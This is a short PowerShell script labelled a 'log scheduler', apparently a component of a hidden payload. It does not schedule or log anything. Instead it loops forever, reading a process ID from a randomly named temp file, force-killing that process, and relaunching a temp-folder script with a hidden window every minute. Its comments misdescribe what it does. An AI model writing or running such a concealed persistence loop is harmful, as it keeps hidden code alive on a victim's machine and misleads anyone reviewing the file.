# powershell log scheduler
# created by : C0SM0

for(;;) {
    try {
     # invoke the worker script
     $proc = Get-Content "$env:temp/DdBPKCytRe"
     Stop-process -id $proc -Force
     powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
    }
    catch {
     # do something with $_, log it, more likely
    }
   
    # wait for a minute
    Start-Sleep 60
   }

# sort the times in chronological order
